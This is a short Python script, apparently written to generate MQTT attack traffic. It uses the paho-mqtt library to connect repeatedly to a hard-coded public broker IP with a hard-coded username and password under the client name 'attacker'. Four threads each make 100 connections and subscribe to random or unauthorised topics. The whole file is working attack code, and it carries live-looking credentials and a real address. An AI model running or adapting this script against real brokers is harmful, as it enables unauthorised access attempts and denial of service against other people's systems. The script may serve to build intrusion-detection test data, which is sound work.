#for this attack to work, we need to keep valid log in credentials, to connect to server
#we can subscribe on a random topic to broker / we can subscibe on topic to which we don't have access to

import paho.mqtt.client as mqtt #import the Paho MQTT client package
import threading
import time
import string
import random
import random

def on_connect(client, userdata, flags, rc):
    print("Connected flags: ",str(flags),"result code ",str(rc))

def makeSubscription_random(client,broker_ip):
	topic_depth = random.randint(1,6)
	topic = ""
	for item in range(topic_depth):
		curr_len = random.randint(1,10)
		curr_level_topic = ''.join(random.choices(string.ascii_uppercase, k = curr_len))
		if topic != "":
			topic += "/"+curr_level_topic
		else:
			topic += curr_level_topic
	client.subscribe(topic)

	
def makeConnection():
	for _ in range(100):
		broker_address="34.125.53.182"
		client = mqtt.Client("attacker",clean_session=True) #create new instance
		_username = "mqttbroker"
		_password = "test123"
		client.username_pw_set(username=_username,password=_password)
		client.on_connect = on_connect
		client.loop_start()  #start the call back loop
		client.connect(broker_address) #connect to broker
		makeSubscription_random(client,broker_address)
		gap = random.randint(0,60)
		time.sleep(gap) #wait
		client.loop_stop()  #stop the call back loop
		client.disconnect()


thread1 = threading.Thread(target=makeConnection)
thread2 = threading.Thread(target=makeConnection)
thread3 = threading.Thread(target=makeConnection)
thread4 = threading.Thread(target=makeConnection)


thread1.start()
thread2.start()
thread3.start()
thread4.start()

thread1.join()
thread2.join()
thread3.join()
thread4.join()
